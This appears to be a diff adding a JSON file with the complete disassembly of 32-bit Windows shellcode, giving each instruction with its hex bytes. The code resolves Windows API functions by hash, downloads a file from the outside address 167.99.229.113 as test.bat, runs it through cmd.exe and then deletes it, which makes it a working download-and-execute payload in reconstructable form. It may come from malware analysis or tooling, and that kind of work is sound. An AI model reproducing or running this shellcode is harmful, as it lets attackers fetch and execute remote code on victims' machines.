@@ -1,0 +1,1537 @@
+{
+   "disassembly": [
+      {
+         "address": "0x0",
+         "instruction": "call 5",
+         "hex": "e800000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x5",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": "label_0x5:"
+      },
+      {
+         "address": "0x6",
+         "instruction": "lea edx, [edx - 5]",
+         "hex": "8d52fb",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x9",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xa",
+         "instruction": "mov ebx, 0x4b1ffe8e",
+         "hex": "bb8efe1f4b",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xf",
+         "instruction": "call 0xc3",
+         "hex": "e8af000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x14",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x15",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x17",
+         "instruction": "mov ebp, eax",
+         "hex": "89c5",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x19",
+         "instruction": "lea esi, [edx + 0x193]",
+         "hex": "8db293010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1f",
+         "instruction": "lea edi, [edx + 0x1af]",
+         "hex": "8dbaaf010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x25",
+         "instruction": "call 0xf9",
+         "hex": "e8cf000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x2a",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x2b",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x2c",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x2d",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x2e",
+         "instruction": "lea eax, [edx + 0x1d3]",
+         "hex": "8d82d3010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x34",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x35",
+         "instruction": "call dword ptr [edx + 0x1bb]",
+         "hex": "ff92bb010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x3b",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x3c",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x3d",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x3e",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x3f",
+         "instruction": "mov ebp, eax",
+         "hex": "89c5",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x41",
+         "instruction": "lea esi, [edx + 0x1c7]",
+         "hex": "8db2c7010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x47",
+         "instruction": "lea edi, [edx + 0x1cf]",
+         "hex": "8dbacf010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x4d",
+         "instruction": "call 0xf9",
+         "hex": "e8a7000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x52",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x53",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x54",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x55",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x56",
+         "instruction": "xor eax, eax",
+         "hex": "31c0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x58",
+         "instruction": "lea esi, [edx + 0x1f2]",
+         "hex": "8db2f2010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x5e",
+         "instruction": "lea edi, [edx + 0x214]",
+         "hex": "8dba14020000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x64",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x65",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x66",
+         "instruction": "push edi",
+         "hex": "57",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x67",
+         "instruction": "push esi",
+         "hex": "56",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x68",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x69",
+         "instruction": "push dword ptr [edx + 0x1cf]",
+         "hex": "ffb2cf010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x6f",
+         "instruction": "pop eax",
+         "hex": "58",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x70",
+         "instruction": "call eax",
+         "hex": "ffd0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x72",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x73",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x74",
+         "instruction": "xor ecx, ecx",
+         "hex": "31c9",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x76",
+         "instruction": "cmp ecx, eax",
+         "hex": "39c1",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x78",
+         "instruction": "jne 0xb2",
+         "hex": "7538",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x7a",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x7b",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x7c",
+         "instruction": "call 0x17a",
+         "hex": "e8f9000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x81",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x82",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x83",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x84",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x85",
+         "instruction": "call 0x15e",
+         "hex": "e8d4000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x8a",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x8b",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x8c",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x8d",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x8e",
+         "instruction": "push 0x3000",
+         "hex": "6800300000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x93",
+         "instruction": "push dword ptr [edx + 0x1bf]",
+         "hex": "ffb2bf010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x99",
+         "instruction": "pop eax",
+         "hex": "58",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x9a",
+         "instruction": "call eax",
+         "hex": "ffd0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x9c",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x9d",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x9e",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x9f",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xa0",
+         "instruction": "lea edi, [edx + 0x214]",
+         "hex": "8dba14020000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xa6",
+         "instruction": "push edi",
+         "hex": "57",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xa7",
+         "instruction": "push dword ptr [edx + 0x1b3]",
+         "hex": "ffb2b3010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xad",
+         "instruction": "pop eax",
+         "hex": "58",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xae",
+         "instruction": "call eax",
+         "hex": "ffd0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb0",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb1",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb2",
+         "instruction": "push ebp",
+         "hex": "55",
+         "string": "",
+         "label": "label_0xb2:"
+      },
+      {
+         "address": "0xb3",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb4",
+         "instruction": "xor eax, eax",
+         "hex": "31c0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb6",
+         "instruction": "inc eax",
+         "hex": "40",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb7",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xb8",
+         "instruction": "push dword ptr [edx + 0x1b7]",
+         "hex": "ffb2b7010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xbe",
+         "instruction": "pop eax",
+         "hex": "58",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xbf",
+         "instruction": "call eax",
+         "hex": "ffd0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xc1",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xc2",
+         "instruction": "pop ebp",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xc3",
+         "instruction": "cld",
+         "hex": "fc",
+         "string": "",
+         "label": "label_0xc3:"
+      },
+      {
+         "address": "0xc4",
+         "instruction": "xor edi, edi",
+         "hex": "31ff",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xc6",
+         "instruction": "mov edi, dword ptr fs:[0x30]",
+         "hex": "648b3d30000000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xcd",
+         "instruction": "mov edi, dword ptr [edi + 0xc]",
+         "hex": "8b7f0c",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xd0",
+         "instruction": "mov edi, dword ptr [edi + 0x14]",
+         "hex": "8b7f14",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xd3",
+         "instruction": "mov esi, dword ptr [edi + 0x28]",
+         "hex": "8b7728",
+         "string": "",
+         "label": "label_0xd3:"
+      },
+      {
+         "address": "0xd6",
+         "instruction": "xor edx, edx",
+         "hex": "31d2",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xd8",
+         "instruction": "lodsw ax, word ptr [esi]",
+         "hex": "66ad",
+         "string": "",
+         "label": "label_0xd8:"
+      },
+      {
+         "address": "0xda",
+         "instruction": "test al, al",
+         "hex": "84c0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xdc",
+         "instruction": "je 0xef",
+         "hex": "7411",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xde",
+         "instruction": "cmp al, 0x41",
+         "hex": "3c41",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xe0",
+         "instruction": "jb 0xe8",
+         "hex": "7206",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xe2",
+         "instruction": "cmp al, 0x5a",
+         "hex": "3c5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xe4",
+         "instruction": "ja 0xe8",
+         "hex": "7702",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xe6",
+         "instruction": "or al, 0x20",
+         "hex": "0c20",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xe8",
+         "instruction": "rol edx, 7",
+         "hex": "c1c207",
+         "string": "",
+         "label": "label_0xe8:"
+      },
+      {
+         "address": "0xeb",
+         "instruction": "xor dl, al",
+         "hex": "30c2",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xed",
+         "instruction": "jmp 0xd8",
+         "hex": "ebe9",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xef",
+         "instruction": "cmp edx, ebx",
+         "hex": "39da",
+         "string": "",
+         "label": "label_0xef:"
+      },
+      {
+         "address": "0xf1",
+         "instruction": "mov eax, dword ptr [edi + 0x10]",
+         "hex": "8b4710",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xf4",
+         "instruction": "mov edi, dword ptr [edi]",
+         "hex": "8b3f",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xf6",
+         "instruction": "jne 0xd3",
+         "hex": "75db",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xf8",
+         "instruction": "ret",
+         "hex": "c3",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xf9",
+         "instruction": "mov edx, ebp",
+         "hex": "89ea",
+         "string": "",
+         "label": "label_0xf9:"
+      },
+      {
+         "address": "0xfb",
+         "instruction": "add edx, dword ptr [edx + 0x3c]",
+         "hex": "03523c",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0xfe",
+         "instruction": "mov edx, dword ptr [edx + 0x78]",
+         "hex": "8b5278",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x101",
+         "instruction": "add edx, ebp",
+         "hex": "01ea",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x103",
+         "instruction": "mov ebx, dword ptr [edx + 0x20]",
+         "hex": "8b5a20",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x106",
+         "instruction": "add ebx, ebp",
+         "hex": "01eb",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x108",
+         "instruction": "xor ecx, ecx",
+         "hex": "31c9",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x10a",
+         "instruction": "push edi",
+         "hex": "57",
+         "string": "",
+         "label": "label_0x10a:"
+      },
+      {
+         "address": "0x10b",
+         "instruction": "push esi",
+         "hex": "56",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x10c",
+         "instruction": "mov esi, dword ptr [esi]",
+         "hex": "8b36",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x10e",
+         "instruction": "mov edi, dword ptr [ebx]",
+         "hex": "8b3b",
+         "string": "",
+         "label": "label_0x10e:"
+      },
+      {
+         "address": "0x110",
+         "instruction": "add edi, ebp",
+         "hex": "01ef",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x112",
+         "instruction": "push edx",
+         "hex": "52",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x113",
+         "instruction": "xor edx, edx",
+         "hex": "31d2",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x115",
+         "instruction": "rol edx, 7",
+         "hex": "c1c207",
+         "string": "",
+         "label": "label_0x115:"
+      },
+      {
+         "address": "0x118",
+         "instruction": "xor dl, byte ptr [edi]",
+         "hex": "3217",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x11a",
+         "instruction": "inc edi",
+         "hex": "47",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x11b",
+         "instruction": "cmp byte ptr [edi], 0",
+         "hex": "803f00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x11e",
+         "instruction": "jne 0x115",
+         "hex": "75f5",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x120",
+         "instruction": "xchg eax, edx",
+         "hex": "92",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x121",
+         "instruction": "pop edx",
+         "hex": "5a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x122",
+         "instruction": "cmp eax, esi",
+         "hex": "39f0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x124",
+         "instruction": "je 0x132",
+         "hex": "740c",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x126",
+         "instruction": "add ebx, 4",
+         "hex": "83c304",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x129",
+         "instruction": "inc ecx",
+         "hex": "41",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x12a",
+         "instruction": "cmp dword ptr [edx + 0x18], ecx",
+         "hex": "394a18",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x12d",
+         "instruction": "jne 0x10e",
+         "hex": "75df",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x12f",
+         "instruction": "pop esi",
+         "hex": "5e",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x130",
+         "instruction": "pop edi",
+         "hex": "5f",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x131",
+         "instruction": "ret",
+         "hex": "c3",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x132",
+         "instruction": "pop esi",
+         "hex": "5e",
+         "string": "",
+         "label": "label_0x132:"
+      },
+      {
+         "address": "0x133",
+         "instruction": "pop edi",
+         "hex": "5f",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x134",
+         "instruction": "lodsd eax, dword ptr [esi]",
+         "hex": "ad",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x135",
+         "instruction": "push esi",
+         "hex": "56",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x136",
+         "instruction": "push ebx",
+         "hex": "53",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x137",
+         "instruction": "mov ebx, ebp",
+         "hex": "89eb",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x139",
+         "instruction": "mov esi, ebx",
+         "hex": "89de",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x13b",
+         "instruction": "add ebx, dword ptr [edx + 0x24]",
+         "hex": "035a24",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x13e",
+         "instruction": "lea eax, [ebx + ecx*2]",
+         "hex": "8d044b",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x141",
+         "instruction": "movzx eax, word ptr [eax]",
+         "hex": "0fb700",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x144",
+         "instruction": "lea eax, [esi + eax*4]",
+         "hex": "8d0486",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x147",
+         "instruction": "add eax, dword ptr [edx + 0x1c]",
+         "hex": "03421c",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x14a",
+         "instruction": "mov eax, dword ptr [eax]",
+         "hex": "8b00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x14c",
+         "instruction": "add eax, esi",
+         "hex": "01f0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x14e",
+         "instruction": "stosd dword ptr es:[edi], eax",
+         "hex": "ab",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x14f",
+         "instruction": "pop ebx",
+         "hex": "5b",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x150",
+         "instruction": "pop esi",
+         "hex": "5e",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x151",
+         "instruction": "add ebx, 4",
+         "hex": "83c304",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x154",
+         "instruction": "inc ecx",
+         "hex": "41",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x155",
+         "instruction": "cmp dword ptr [esi], 0xffff",
+         "hex": "813effff0000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x15b",
+         "instruction": "jne 0x10a",
+         "hex": "75ad",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x15d",
+         "instruction": "ret",
+         "hex": "c3",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x15e",
+         "instruction": "lea esi, [edx + 0x1de]",
+         "hex": "8db2de010000",
+         "string": "",
+         "label": "label_0x15e:"
+      },
+      {
+         "address": "0x164",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x165",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x166",
+         "instruction": "xor eax, eax",
+         "hex": "31c0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x168",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x169",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16a",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16b",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16c",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16d",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16e",
+         "instruction": "push esi",
+         "hex": "56",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x16f",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x170",
+         "instruction": "push dword ptr [edx + 0x1af]",
+         "hex": "ffb2af010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x176",
+         "instruction": "pop eax",
+         "hex": "58",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x177",
+         "instruction": "call eax",
+         "hex": "ffd0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x179",
+         "instruction": "ret",
+         "hex": "c3",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x17a",
+         "instruction": "xor eax, eax",
+         "hex": "31c0",
+         "string": "",
+         "label": "label_0x17a:"
+      },
+      {
+         "address": "0x17c",
+         "instruction": "push 0x40",
+         "hex": "6a40",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x17e",
+         "instruction": "push 0x1000",
+         "hex": "6800100000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x183",
+         "instruction": "push 0x200",
+         "hex": "6800020000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x188",
+         "instruction": "push eax",
+         "hex": "50",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x189",
+         "instruction": "push dword ptr [edx + 0x1c3]",
+         "hex": "ffb2c3010000",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x18f",
+         "instruction": "pop eax",
+         "hex": "58",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x190",
+         "instruction": "call eax",
+         "hex": "ffd0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x192",
+         "instruction": "ret",
+         "hex": "c3",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x193",
+         "instruction": "db 0xc7",
+         "hex": "c7",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x194",
+         "instruction": "mov dh, byte ptr [ecx]",
+         "hex": "8a31",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x196",
+         "instruction": "inc esi",
+         "hex": "46",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x197",
+         "instruction": "fcomip st(0)",
+         "hex": "dff0",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x199",
+         "instruction": "lock sbb dword ptr [ecx], 0x2695902b",
+         "hex": "f081192b909526",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1a0",
+         "instruction": "sub byte ptr [eax + ecx*8 + 0x3d9972f5], 0xfe",
+         "hex": "80acc8f572993dfe",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1a8",
+         "instruction": "push 0x7a",
+         "hex": "6a7a",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1aa",
+         "instruction": "db 0x69",
+         "hex": "69",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1ab",
+         "instruction": "db 0xff",
+         "hex": "ff",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1ac",
+         "instruction": "inc dword ptr [eax]",
+         "hex": "ff00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1ae",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1af",
+         "instruction": "CreateProcessA - API pointer",
+         "hex": "aa352614",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1b3",
+         "instruction": "DeleteFileA - API pointer",
+         "hex": "64792614",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1b7",
+         "instruction": "ExitProcess - API pointer",
+         "hex": "309f2614",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1bb",
+         "instruction": "LoadLibraryA - API pointer",
+         "hex": "f76e2614",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1bf",
+         "instruction": "Sleep - API pointer",
+         "hex": "37362614",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1c3",
+         "instruction": "VirtualAlloc - API pointer",
+         "hex": "8e3d2614",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1c7",
+         "instruction": "db 0x99",
+         "hex": "99",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1c8",
+         "instruction": "db 0x23",
+         "hex": "23",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1c9",
+         "instruction": "db 0x5d",
+         "hex": "5d",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1ca",
+         "instruction": "db 0xd9",
+         "hex": "d9",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1cb",
+         "instruction": "db 0xff",
+         "hex": "ff",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1cc",
+         "instruction": "db 0xff",
+         "hex": "ff",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1cd",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1ce",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1cf",
+         "instruction": "URLDownloadToFileA - API pointer",
+         "hex": "a42c2a16",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1d3",
+         "instruction": "urlmon.dll ; string",
+         "hex": "75726c6d6f6e2e64...",
+         "string": "urlmon.dll",
+         "label": ""
+      },
+      {
+         "address": "0x1dd",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1de",
+         "instruction": "cmd.exe /c test.bat ; string",
+         "hex": "636d642e65786520...",
+         "string": "cmd.exe /c test.bat",
+         "label": ""
+      },
+      {
+         "address": "0x1f1",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x1f2",
+         "instruction": "http://167.99.229.113/default.css ; string",
+         "hex": "687474703a2f2f31...",
+         "string": "http://167.99.229.113/default.css",
+         "label": ""
+      },
+      {
+         "address": "0x213",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x214",
+         "instruction": "test.bat ; string",
+         "hex": "746573742e626174",
+         "string": "",
+         "label": ""
+      },
+      {
+         "address": "0x21c",
+         "instruction": "db 0x00",
+         "hex": "00",
+         "string": "",
+         "label": ""
+      }
+   ]
+}
